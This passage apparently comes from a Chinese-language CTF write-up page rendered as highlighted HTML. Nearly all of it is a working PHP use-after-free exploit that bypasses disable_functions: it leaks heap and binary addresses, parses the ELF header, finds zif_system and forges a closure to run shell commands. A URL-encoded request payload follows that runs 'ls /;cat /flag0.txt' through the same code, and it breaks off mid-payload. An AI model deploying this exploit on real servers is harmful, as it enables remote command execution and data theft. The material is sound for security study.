<span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"> </span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"> </span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ç›´æ¥è´´ä¸€ä¸ª payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=%<span class="number">3</span>f%<span class="number">3</span>e%<span class="number">3</span>c%<span class="number">3</span>fphp%<span class="number">0</span>apwn(%<span class="number">22</span>ls+%<span class="number">2</span>f%<span class="number">3</span>bcat+%<span class="number">2</span>fflag0.txt%<span class="number">22</span>)%<span class="number">3</span>b%<span class="number">0</span>a%<span class="number">0</span>afunction+<span class="title function_ invoke__">pwn</span>(%<span class="number">24</span>cmd)+%<span class="number">7</span>b%<span class="number">0</span>a++++<span class="keyword">global</span>+%<span class="number">24</span>abc%<span class="number">2</span>c+%<span class="number">24</span>helper%<span class="number">2</span>c+%<span class="number">24</span>backtrace%<span class="number">3</span>b%<span class="number">0</span>a++++<span class="class"><span class="keyword">class</span>+<span class="title">Vuln</span>+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">public</span>+%24<span class="title">a</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">public</span>+<span class="title">function</span>+<span class="title">__destruct</span>()+%7<span class="title">b</span>+%0<span class="title">a</span>++++++++++++<span class="title">global</span>+%24<span class="title">backtrace</span>%3<span class="title">b</span>+%0<span class="title">a</span>++++++++++++<span class="title">unset</span>(%24<span class="title">this</span>-%3<span class="title">ea</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">backtrace</span>+%3<span class="title">d</span>+(<span class="title">new</span>+<span class="title">Exception</span>)-%3<span class="title">egetTrace</span>()%3<span class="title">b</span>+%23+%3<span class="title">b</span>)%0<span class="title">a</span>++++++++++++<span class="title">if</span>(!<span class="title">isset</span>(%24<span class="title">backtrace</span>%5<span class="title">b1</span>%5<span class="title">d</span>%5<span class="title">b</span>%27<span class="title">args</span>%27%5<span class="title">d</span>))+%7<span class="title">b</span>+%23+<span class="title">PHP</span>+%3<span class="title">e</span>%3<span class="title">d</span>+7.4%0<span class="title">a</span>++++++++++++++++%24<span class="title">backtrace</span>+%3<span class="title">d</span>+<span class="title">debug_backtrace</span>()%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">class</span>+<span class="title">Helper</span>+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">public</span>+%24<span class="title">a</span>%2<span class="title">c</span>+%24<span class="title">b</span>%2<span class="title">c</span>+%24<span class="title">c</span>%2<span class="title">c</span>+%24<span class="title">d</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">str2ptr</span>(%26%24<span class="title">str</span>%2<span class="title">c</span>+%24<span class="title">p</span>+%3<span class="title">d</span>+0%2<span class="title">c</span>+%24<span class="title">s</span>+%3<span class="title">d</span>+8)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">address</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">for</span>(%24<span class="title">j</span>+%3<span class="title">d</span>+%24<span class="title">s</span>-1%3<span class="title">b</span>+%24<span class="title">j</span>+%3<span class="title">e</span>%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">j</span>--)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">address</span>+%3<span class="title">c</span>%3<span class="title">c</span>%3<span class="title">d</span>+8%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">address</span>+%7<span class="title">c</span>%3<span class="title">d</span>+<span class="title">ord</span>(%24<span class="title">str</span>%5<span class="title">b</span>%24<span class="title">p</span>%2<span class="title">b</span>%24<span class="title">j</span>%5<span class="title">d</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++++++<span class="title">return</span>+%24<span class="title">address</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">ptr2str</span>(%24<span class="title">ptr</span>%2<span class="title">c</span>+%24<span class="title">m</span>+%3<span class="title">d</span>+8)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">out</span>+%3<span class="title">d</span>+%22%22%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">for</span>+(%24<span class="title">i</span>%3<span class="title">d0</span>%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+%24<span class="title">m</span>%3<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">b</span>%2<span class="title">b</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">out</span>+.%3<span class="title">d</span>+<span class="title">sprintf</span>(%27%25<span class="title">c</span>%27%2<span class="title">c</span>%24<span class="title">ptr</span>+%26+0<span class="title">xff</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">ptr</span>+%3<span class="title">e</span>%3<span class="title">e</span>%3<span class="title">d</span>+8%3<span class="title">b</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++++++<span class="title">return</span>+%24<span class="title">out</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">write</span>(%26%24<span class="title">str</span>%2<span class="title">c</span>+%24<span class="title">p</span>%2<span class="title">c</span>+%24<span class="title">v</span>%2<span class="title">c</span>+%24<span class="title">n</span>+%3<span class="title">d</span>+8)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">for</span>(%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+%24<span class="title">n</span>%3<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">b</span>%2<span class="title">b</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">str</span>%5<span class="title">b</span>%24<span class="title">p</span>+%2<span class="title">b</span>+%24<span class="title">i</span>%5<span class="title">d</span>+%3<span class="title">d</span>+<span class="title">sprintf</span>(%27%25<span class="title">c</span>%27%2<span class="title">c</span>%24<span class="title">v</span>+%26+0<span class="title">xff</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">v</span>+%3<span class="title">e</span>%3<span class="title">e</span>%3<span class="title">d</span>+8%3<span class="title">b</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">leak</span>(%24<span class="title">addr</span>%2<span class="title">c</span>+%24<span class="title">p</span>+%3<span class="title">d</span>+0%2<span class="title">c</span>+%24<span class="title">s</span>+%3<span class="title">d</span>+8)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">global</span>+%24<span class="title">abc</span>%2<span class="title">c</span>+%24<span class="title">helper</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x68</span>%2<span class="title">c</span>+%24<span class="title">addr</span>+%2<span class="title">b</span>+%24<span class="title">p</span>+-+0<span class="title">x10</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">leak</span>+%3<span class="title">d</span>+<span class="title">strlen</span>(%24<span class="title">helper</span>-%3<span class="title">ea</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">if</span>(%24<span class="title">s</span>+!%3<span class="title">d</span>+8)+%7<span class="title">b</span>+%24<span class="title">leak</span>+%25%3<span class="title">d</span>+2+%3<span class="title">c</span>%3<span class="title">c</span>+(%24<span class="title">s</span>+*+8)+-+1%3<span class="title">b</span>+%7<span class="title">d</span>%0<span class="title">a</span>++++++++<span class="title">return</span>+%24<span class="title">leak</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">parse_elf</span>(%24<span class="title">base</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">e_type</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">base</span>%2<span class="title">c</span>+0<span class="title">x10</span>%2<span class="title">c</span>+2)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++%24<span class="title">e_phoff</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">base</span>%2<span class="title">c</span>+0<span class="title">x20</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">e_phentsize</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">base</span>%2<span class="title">c</span>+0<span class="title">x36</span>%2<span class="title">c</span>+2)%3<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">e_phnum</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">base</span>%2<span class="title">c</span>+0<span class="title">x38</span>%2<span class="title">c</span>+2)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++<span class="title">for</span>(%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+%24<span class="title">e_phnum</span>%3<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">b</span>%2<span class="title">b</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">header</span>+%3<span class="title">d</span>+%24<span class="title">base</span>+%2<span class="title">b</span>+%24<span class="title">e_phoff</span>+%2<span class="title">b</span>+%24<span class="title">i</span>+*+%24<span class="title">e_phentsize</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">p_type</span>++%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">header</span>%2<span class="title">c</span>+0%2<span class="title">c</span>+4)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">p_flags</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">header</span>%2<span class="title">c</span>+4%2<span class="title">c</span>+4)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">p_vaddr</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">header</span>%2<span class="title">c</span>+0<span class="title">x10</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">p_memsz</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">header</span>%2<span class="title">c</span>+0<span class="title">x28</span>)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++++++<span class="title">if</span>(%24<span class="title">p_type</span>+%3<span class="title">d</span>%3<span class="title">d</span>+1+%26%26+%24<span class="title">p_flags</span>+%3<span class="title">d</span>%3<span class="title">d</span>+6)+%7<span class="title">b</span>+%23+<span class="title">PT_LOAD</span>%2<span class="title">c</span>+<span class="title">PF_Read_Write</span>%0<span class="title">a</span>++++++++++++++++%23+<span class="title">handle</span>+<span class="title">pie</span>%0<span class="title">a</span>++++++++++++++++%24<span class="title">data_addr</span>+%3<span class="title">d</span>+%24<span class="title">e_type</span>+%3<span class="title">d</span>%3<span class="title">d</span>+2+%3<span class="title">f</span>+%24<span class="title">p_vaddr</span>+%3<span class="title">a</span>+%24<span class="title">base</span>+%2<span class="title">b</span>+%24<span class="title">p_vaddr</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++++++%24<span class="title">data_size</span>+%3<span class="title">d</span>+%24<span class="title">p_memsz</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%7<span class="title">d</span>+<span class="title">else</span>+<span class="title">if</span>(%24<span class="title">p_type</span>+%3<span class="title">d</span>%3<span class="title">d</span>+1+%26%26+%24<span class="title">p_flags</span>+%3<span class="title">d</span>%3<span class="title">d</span>+5)+%7<span class="title">b</span>+%23+<span class="title">PT_LOAD</span>%2<span class="title">c</span>+<span class="title">PF_Read_exec</span>%0<span class="title">a</span>++++++++++++++++%24<span class="title">text_size</span>+%3<span class="title">d</span>+%24<span class="title">p_memsz</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++<span class="title">if</span>(!%24<span class="title">data_addr</span>+%7<span class="title">c</span>%7<span class="title">c</span>+!%24<span class="title">text_size</span>+%7<span class="title">c</span>%7<span class="title">c</span>+!%24<span class="title">data_size</span>)%0<span class="title">a</span>++++++++++++<span class="title">return</span>+<span class="title">false</span>%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++<span class="title">return</span>+%5<span class="title">b</span>%24<span class="title">data_addr</span>%2<span class="title">c</span>+%24<span class="title">text_size</span>%2<span class="title">c</span>+%24<span class="title">data_size</span>%5<span class="title">d</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">get_basic_funcs</span>(%24<span class="title">base</span>%2<span class="title">c</span>+%24<span class="title">elf</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">list</span>(%24<span class="title">data_addr</span>%2<span class="title">c</span>+%24<span class="title">text_size</span>%2<span class="title">c</span>+%24<span class="title">data_size</span>)+%3<span class="title">d</span>+%24<span class="title">elf</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">for</span>(%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+%24<span class="title">data_size</span>+%2<span class="title">f</span>+8%3<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">b</span>%2<span class="title">b</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">leak</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">data_addr</span>%2<span class="title">c</span>+%24<span class="title">i</span>+*+8)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++<span class="title">if</span>(%24<span class="title">leak</span>+-+%24<span class="title">base</span>+%3<span class="title">e</span>+0+%26%26+%24<span class="title">leak</span>+-+%24<span class="title">base</span>+%3<span class="title">c</span>+%24<span class="title">data_addr</span>+-+%24<span class="title">base</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++++++%24<span class="title">deref</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">leak</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++++++%23+%27<span class="title">constant</span>%27+<span class="title">constant</span>+<span class="title">check</span>%0<span class="title">a</span>++++++++++++++++<span class="title">if</span>(%24<span class="title">deref</span>+!%3<span class="title">d</span>+0<span class="title">x746e6174736e6f63</span>)%0<span class="title">a</span>++++++++++++++++++++<span class="title">continue</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%7<span class="title">d</span>+<span class="title">else</span>+<span class="title">continue</span>%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++++++%24<span class="title">leak</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">data_addr</span>%2<span class="title">c</span>+(%24<span class="title">i</span>+%2<span class="title">b</span>+4)+*+8)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++<span class="title">if</span>(%24<span class="title">leak</span>+-+%24<span class="title">base</span>+%3<span class="title">e</span>+0+%26%26+%24<span class="title">leak</span>+-+%24<span class="title">base</span>+%3<span class="title">c</span>+%24<span class="title">data_addr</span>+-+%24<span class="title">base</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++++++%24<span class="title">deref</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">leak</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++++++%23+%27<span class="title">bin2hex</span>%27+<span class="title">constant</span>+<span class="title">check</span>%0<span class="title">a</span>++++++++++++++++<span class="title">if</span>(%24<span class="title">deref</span>+!%3<span class="title">d</span>+0<span class="title">x786568326e6962</span>)%0<span class="title">a</span>++++++++++++++++++++<span class="title">continue</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%7<span class="title">d</span>+<span class="title">else</span>+<span class="title">continue</span>%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++++++<span class="title">return</span>+%24<span class="title">data_addr</span>+%2<span class="title">b</span>+%24<span class="title">i</span>+*+8%3<span class="title">b</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">get_binary_base</span>(%24<span class="title">binary_leak</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">base</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">start</span>+%3<span class="title">d</span>+%24<span class="title">binary_leak</span>+%26+0<span class="title">xfffffffffffff000</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">for</span>(%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+0<span class="title">x1000</span>%3<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">b</span>%2<span class="title">b</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">addr</span>+%3<span class="title">d</span>+%24<span class="title">start</span>+-+0<span class="title">x1000</span>+*+%24<span class="title">i</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">leak</span>+%3<span class="title">d</span>+<span 